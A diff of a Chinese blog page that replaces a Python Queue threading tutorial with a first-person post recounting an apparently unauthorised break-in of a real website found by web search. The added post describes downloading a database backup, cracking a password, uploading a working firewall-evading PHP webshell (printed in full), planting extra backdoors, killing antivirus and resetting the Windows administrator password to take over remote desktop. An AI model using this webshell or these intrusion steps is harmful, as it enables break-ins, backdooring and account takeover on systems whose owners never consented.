@@ -13,11 +13,11 @@
 
     <title>
         
-          Python 用Queue/queue模块来实现多线程间通信 - Kingkk&#39;s Blog
+          第一次远程桌面的日站过程 - Kingkk&#39;s Blog
         
     </title>
 
-    <link rel="canonical" href="https://www.kingkk/2017/12/python用queuequeue模块来实现多线程间通信/">
+    <link rel="canonical" href="https://www.kingkk/2018/02/第一次远程桌面的日站过程/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -166,11 +166,11 @@
                     <div class="tags">
                         
                     </div>
-                    <h1>Python 用Queue/queue模块来实现多线程间通信</h1>
+                    <h1>第一次远程桌面的日站过程</h1>
                     <h2 class="subheading"></h2>
                     <span class="meta">
                         Posted by kingkk on
-                        2017-12-09
+                        2018-02-21
                     </span>
                 </div>
             </div>
@@ -189,56 +189,11 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <p>使用Queue模块（2.x版本，3.x版本中重命名为queue），通过创建一个队列来提供线程间通信的机制，从而让线程之间可以互相分享数据。 先列举一下Queue模块中的一些属性</p>
-<h5 id="Queue-queue模块的类"><a href="#Queue-queue模块的类" class="headerlink" title="Queue/queue模块的类"></a>Queue/queue模块的类</h5><ul>
-<li><code>Queue(maxsize=0)</code> 创建一个先入先出队列。若指定maxsize，则在队列满时阻塞；否则则为无限队列</li>
-<li><code>LifoQueue(maxsize=0)</code> 创建一个后入先出队列（个人感觉更应该叫堆栈&gt;_&lt;）。若制定maxsize，则在队列满时阻塞，否则为无限队列</li>
-<li><code>PriorityQueue(maxsize=0)</code> 创建一个优先级队列。若指定maxsize，则在队列满时阻塞；否则则为无限队列</li>
-</ul>
-<h5 id="Queue-queue异常"><a href="#Queue-queue异常" class="headerlink" title="Queue/queue异常"></a>Queue/queue异常</h5><ul>
-<li><code>Empty</code> 当空队列调用get()方法时抛出异常</li>
-<li><code>Full</code> 当已满队列调用put()方法时抛出异常</li>
-</ul>
-<h5 id="Queue-queue对象方法"><a href="#Queue-queue对象方法" class="headerlink" title="Queue/queue对象方法"></a>Queue/queue对象方法</h5><ul>
-<li><code>qsize()</code> 返回队列大小</li>
-<li><code>empty()</code> 队列为空时返回True，不为空返回False</li>
-<li><code>full()</code> 队列已满，返回True，否则返回False</li>
-<li><code>put(item,block=True,timeout=None)</code> 将item放入队列</li>
-<li><code>put_nowait(item)</code> 和put(item,False)相同</li>
-<li><code>get(block=True,timeout=None)</code> 从队列中取得元素</li>
-<li><code>get_nowait()</code> 和get(False)相同</li>
-<li><code>task_done()</code> 用于表示队列中的某个元素已经执行完成，该方法会被join()使用</li>
-<li><code>join()</code> 在队列中所有元素执行完毕并调用上面的task_done()之前，保持阻塞</li>
-</ul>
-<p>顺便提一下<strong>阻塞（block）</strong>这个概念（毕竟自己之前一直不知道阻塞什么意思，就看书看的也一脸懵） 通俗的说就是等待，比如该资源被另一个线程所使用，当该线程想使用该线程时就会处于一种阻塞状态，就是等待别人使用完该资源，或者是说等待有资源可以被自己使用之后再来使用该资源。 当block参数为False，就处于不阻塞的状态，此时，当资源被别的线程占据时，该线程就不会再去等待别人使用完线程，而是选择直接抛出一个异常。 put与get中的block就是设定该命令在资源无法使用时是否进行阻塞等待，timeout则是指定等待的时间. 如下是一个示例：</p>
-<p>#encoding=utf8<br>from random import randint<br>from time import sleep,ctime<br>from Queue import Queue<br>import threading</p>
-<p>class MyThread(threading.Thread):    #之前定义过了的一个MyThread类<br>    def __init__(self,func,args,name=’’):<br>        threading.Thread.__init__(self)<br>        self.name = name<br>        self.func = func<br>        self.args = args</p>
-<pre><code>def getResult(self):
-    return self.res 
-
-def run(self):
-    print &quot;starting&quot;,self.name,&quot;at:&quot;,ctime()
-    self.res = self.func(*self.args)
-    print self.name,&quot;finished at:&quot;,ctime()
-</code></pre><p>def writeQ(queue):<br>    print ‘producing object form Q…’,<br>    queue.put(‘xxx’,1),<br>    print ‘size now’,queue.qsize()</p>
-<p>def readQ(queue):<br>    val = queue.get(1)<br>    print ‘consumed object from Q … size now ‘,queue.qsize()</p>
-<p>def writer(queue,loops):<br>    for i in range(loops):<br>        writeQ(queue)<br>        sleep(randint(1,3))</p>
-<p>def reader(queue,loops):<br>    for i in range(loops):<br>        readQ(queue)<br>        sleep(randint(2,5))</p>
-<p>funcs = [writer,reader]</p>
-<p>def main():<br>    nloops = randint(2,5)<br>    q = Queue(32)<br>    threads = []<br>    for i in range(len(funcs)):<br>        t = MyThread(funcs[i],(q,nloops),funcs[i].__name__)<br>        threads.append(t)</p>
-<pre><code>for i in range(len(funcs)):
-    threads\[i\].start()
-
-for i in range(len(funcs)):
-    threads\[i\].join()
-
-print &apos;ALL DONE&apos;
-</code></pre><p>if __name__ == ‘__main__‘:<br>    main()</p>
-<p>简单解释下上面代码，对writer与reader随机创建2-4次循环，writer负责往队列中放入元素，reader负责往对列中取出元素。write随机sleep1-3秒，reader随机sleep2-5秒。（尽可能使放入比取出操作更快） 运行结果如下</p>
-<p>starting writer at: Sat Dec 09 17:48:56 2017<br>producing object form Q… size now 1<br>starting reader at: Sat Dec 09 17:48:56 2017<br>consumed object from Q … size now 0<br>producing object form Q… size now 1<br>consumed object from Q … size now 0<br>producing object form Q… size now 1<br>producing object form Q… size now 2<br>consumed object from Q … size now 1<br>producing object form Q… size now 2<br>writer finished at: Sat Dec 09 17:49:05 2017<br>consumed object from Q … size now 1<br>consumed object from Q … size now 0<br>reader finished at: Sat Dec 09 17:49:16 2017<br>ALL DONE</p>
-<p>若使取出操作比放入更快时，仅需修改随机sleep的部分，输出如下</p>
-<p>starting writer at: Sat Dec 09 17:57:04 2017<br>producing object form Q… size now 1<br>starting reader at: Sat Dec 09 17:57:04 2017<br>consumed object from Q … size now 0<br>producing object form Q… size now 1<br>consumed object from Q … size now 0<br>producing object form Q… size now 1<br>consumed object from Q … size now 0<br>producing object form Q… size now 1<br>consumed object from Q … size now 0<br>writerreader finished at:finished at: Sat Dec 09 17:57:17 2017Sat Dec 09 17:57:17 2017</p>
-<p><strong>当没有资源可以消耗时，reader会处于阻塞状态，每当write填充一个资源时，reader会立即随之执行</strong></p>
+                <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>既然都说日站孰能生巧，日多了才能出感觉，今天就在找一些网站进行测试。<br>然后无意间百度出了一个功能很奇怪的网页，居然能查看目录。<br>然后折腾了一天，终于能远程登录了。就记录一下，算是一次实战经验。  </p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>一开始看到的网页是这个样子的 <img src="http://blog.kingkk.com/wp-content/uploads/2018/02/14af5bb0132db9807b857696125cbd10.png" alt><br>一看这url，path参数不就是路径名么。而且好像还可以查看非网站目录，应该是phpstudy的原因，导致权限较高。<br>虽然能看目录，但是看不了里面的内容，那就翻翻有没有什么备份文件之类的，然后找呀找 找到了个.sql文件。<br>然后通过浏览器访问一下，导出来，加到自己数据库看看有什么数据 然后随便找了个用户，密码用md5解密一下，123456<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/02/cae3ff8dc21f98a3793cc7c41400d227.png" alt><br>进主页登录一下看看有什么数据<br>危害最大的应该就是上传漏洞了，于是就先测试了下上传功能。 随便上传了个class.php竟然直接成功了，而且发现连文件名都不改，直接传上去了<br>既然这样，那就直接上一句话啊，还等什么<br>可是上了当真的上一句话的时候，好像有防火墙，把文件内容都给改了，还会把名称变成.log<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/02/967352f6ffd24be8f64b8cbde421965c.png" alt><br>然后没办法，试试改下文件名php3,php5可是phpstudy好像不解析，还因为上传恶意代码被各种banip，自己的ip全挂了，还去网上找了公用的Ip代理<br>最后，从土司上找的一句话成功过防火墙，上传成功 <strong>assert.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$&#123;<span class="string">"function"</span>&#125;=substr(\_\_FILE\_\_,<span class="number">-10</span>,<span class="number">-4</span>);;</span><br><span class="line">$&#123;<span class="string">"command"</span>&#125;=$_POST\[cmd\];</span><br><span class="line">$function($command);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>后来发现有个局限，就是文件名上传之后不能被更改，因为是取了文件名作为函数关键字，不过恰巧这里不改文件名<br>然后成功上了菜刀 上了菜刀后，习惯性多加几个后门，以防这里被删<br>后来想上传个大马，发现还是会被防火墙拦截，还有被ban了，难受<br>后来进菜刀自带的命令行，由于是phpstudy的原因，权限还蛮高，把那几个杀软全给kill了<br>接下来就是netstat看看端口<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/02/6fde6e4d568c64ba560c7a88ab55b0ef.png" alt><br>没有3389，但是10086这种奇葩的端口，应该就是远程桌面的 弱口令没成功，然后想着添加用户，返回执行成功，可是一直添加不上去，最后直接修改了管理员密码<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>administrator kingkk</span><br></pre></td></tr></table></figure></p>
+<p>成功连上 <img src="http://blog.kingkk.com/wp-content/uploads/2018/02/3bbe9cba0bbfa77aec494ff519a1ce76.png" alt><br>至于内网漫游的话，其实并不怎么懂内网渗透，而且查了下ip是阿里云的，于是也就没往下走了，至少这台机子已经拿下了，后来翻了翻并没有什么有价值的东西，扫兴  </p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>虽然写起来轻松，实际测试的时候真的弄了好久，可能也是底子不怎么好。被banip真的很难受。<br>而且真的觉得运气好，是网站管理员自己放的几个高危页面进去的（后来发现一开始的同页面下还有直接执行命令行的页面），上传什么都完全没做过滤。<br>算是难得的一次拿下远程桌面的渗透测试。</p>
 
 
                 <hr>
@@ -248,12 +203,12 @@ print &apos;ALL DONE&apos;
                 <ul class="pager">
                     
                         <li class="previous">
-                            <a href="/2017/12/sqli-labs练习(less1-10)/" data-toggle="tooltip" data-placement="top" title="sqli-labs练习（less1-10）">&larr; Previous Post</a>
+                            <a href="/2018/02/记录一次hgame-ctf的注入/" data-toggle="tooltip" data-placement="top" title="记录一次hgame ctf的注入">&larr; Previous Post</a>
                         </li>
                     
                     
                         <li class="next">
-                            <a href="/2017/12/python多线程之同步原语锁简介/" data-toggle="tooltip" data-placement="top" title="Python 多线程之同步原语--锁与信号量简介">Next Post &rarr;</a>
+                            <a href="/2018/02/python-requests库/" data-toggle="tooltip" data-placement="top" title="Python-requests库">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
